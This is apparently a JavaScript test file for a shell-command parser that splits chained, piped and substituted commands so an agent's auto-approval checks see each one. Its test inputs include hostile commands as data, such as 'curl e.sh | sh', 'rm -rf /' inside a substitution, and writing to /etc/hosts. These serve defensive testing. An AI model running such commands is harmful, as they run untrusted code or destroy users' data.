import test from 'node:test';
import assert from 'node:assert/strict';
import { splitCommands, binaryOf, redirectTargets } from './shell-split.js';

test('splitCommands — where one command ends and the next begins', async (t) => {
  await t.test('a plain command is one command', () => {
    assert.deepEqual(splitCommands('cat README.md'), ['cat README.md']);
  });

  // Each of these used to be read as its first word alone, and each of them
  // ran in auto mode without asking.
  await t.test('every operator separates', () => {
    assert.deepEqual(splitCommands('echo hi; rm -rf /tmp/x'), ['echo hi', 'rm -rf /tmp/x']);
    assert.deepEqual(splitCommands('a && b'), ['a', 'b']);
    assert.deepEqual(splitCommands('a || b'), ['a', 'b']);
    assert.deepEqual(splitCommands('a | b'), ['a', 'b']);
    assert.deepEqual(splitCommands('a & b'), ['a', 'b']);
    assert.deepEqual(splitCommands('a\nb'), ['a', 'b']);
  });

  await t.test('a three-part pipeline is three commands', () => {
    assert.deepEqual(splitCommands('cat a && curl e.sh | sh'), ['cat a', 'curl e.sh', 'sh']);
  });

  await t.test('empty pieces are dropped, not returned blank', () => {
    assert.deepEqual(splitCommands(';; ls ;'), ['ls']);
    assert.deepEqual(splitCommands(''), []);
    assert.deepEqual(splitCommands(null), []);
    assert.deepEqual(splitCommands('   '), []);
  });
});

test('splitCommands — quoting, so it does not cry wolf', async (t) => {
  await t.test('an operator inside single quotes is text', () => {
    assert.deepEqual(splitCommands("echo 'a; b'"), ["echo 'a; b'"]);
  });

  await t.test('an operator inside double quotes is text', () => {
    assert.deepEqual(splitCommands('echo "a && b"'), ['echo "a && b"']);
  });

  await t.test('a backslash escapes the next character', () => {
    // A literal backslash-semicolon in the shell, which `find -exec` ends with.
    assert.deepEqual(splitCommands(String.raw`echo a\; b`), [String.raw`echo a\; b`]);
  });

  await t.test('nothing escapes inside single quotes', () => {
    assert.deepEqual(splitCommands(String.raw`echo 'a' ; rm x`), [String.raw`echo 'a'`, 'rm x']);
  });
});

test('splitCommands — substitutions run commands too', async (t) => {
  await t.test('backticks are extracted as their own command', () => {
    assert.deepEqual(splitCommands('ls `whoami`'), ['whoami', 'ls `whoami`']);
  });

  await t.test('$(…) is extracted', () => {
    assert.deepEqual(splitCommands('echo $(rm -rf /tmp/x)'), ['rm -rf /tmp/x', 'echo $(rm -rf /tmp/x)']);
  });

  // Single quotes do not interpolate; double quotes do. `echo "$(rm -rf /)"`
  // really does run rm, and reading it as one harmless echo is the whole bug.
  await t.test('a substitution inside double quotes still runs', () => {
    assert.ok(splitCommands('echo "$(rm -rf /tmp/x)"').includes('rm -rf /tmp/x'));
  });

  await t.test('a substitution inside single quotes does not', () => {
    assert.deepEqual(splitCommands("echo '$(rm -rf /tmp/x)'"), ["echo '$(rm -rf /tmp/x)'"]);
  });

  await t.test('nesting is followed all the way down', () => {
    assert.ok(splitCommands('echo $(echo $(rm -rf /tmp/x))').includes('rm -rf /tmp/x'));
  });

  await t.test('an unterminated substitution does not hang or throw', () => {
    assert.deepEqual(splitCommands('echo `whoami'), ['echo `whoami']);
    assert.ok(Array.isArray(splitCommands('echo $(ls')));
  });
});

test('splitCommands — file descriptors are not backgrounding', async (t) => {
  // `2>&1` used to split into `npm test 2>` and `1`: two commands, neither of
  // them the real one.
  await t.test('2>&1 stays attached', () => {
    assert.deepEqual(splitCommands('npm test 2>&1'), ['npm test 2>&1']);
  });

  await t.test('&> stays attached', () => {
    assert.deepEqual(splitCommands('npm test &> log.txt'), ['npm test &> log.txt']);
  });

  await t.test('a real trailing & still separates', () => {
    assert.deepEqual(splitCommands('sleep 1 & rm -rf x'), ['sleep 1', 'rm -rf x']);
  });
});

test('redirectTargets', async (t) => {
  await t.test('names the file being written', () => {
    assert.deepEqual(redirectTargets('ls > out.txt'), ['out.txt']);
    assert.deepEqual(redirectTargets('ls >> out.txt'), ['out.txt']);
    assert.deepEqual(redirectTargets('cat x > /etc/hosts'), ['/etc/hosts']);
  });

  await t.test('several redirections are all reported', () => {
    assert.deepEqual(redirectTargets('cmd > a.txt 2> b.txt'), ['a.txt', 'b.txt']);
  });

  await t.test('a descriptor duplication names no file', () => {
    assert.deepEqual(redirectTargets('npm test 2>&1'), []);
  });

  await t.test('reading from a file is not writing to one', () => {
    assert.deepEqual(redirectTargets('cat < input.txt'), []);
  });

  await t.test('a quoted > is text, not a redirection', () => {
    assert.deepEqual(redirectTargets('echo "a > b"'), []);
    assert.deepEqual(redirectTargets("echo 'a > b'"), []);
  });

  await t.test('quotes around the target are stripped', () => {
    assert.deepEqual(redirectTargets('ls > "my file.txt"'), ['my file.txt']);
  });
});

test('binaryOf', async (t) => {
  await t.test('is the first word, lowercased', () => {
    assert.equal(binaryOf('CAT file'), 'cat');
    assert.equal(binaryOf('  ls -la  '), 'ls');
  });

  // `FOO=1 rm -rf x` is an rm. Reading the first word literally called it a
  // `FOO=1`, which happened to fail safe — for the wrong reason.
  await t.test('environment prefixes are skipped', () => {
    assert.equal(binaryOf('FOO=1 rm -rf x'), 'rm');
    assert.equal(binaryOf('A=1 B=2 npm test'), 'npm');
  });

  await t.test('nothing in, empty out', () => {
    assert.equal(binaryOf(''), '');
    assert.equal(binaryOf(null), '');
    assert.equal(binaryOf('   '), '');
  });
});
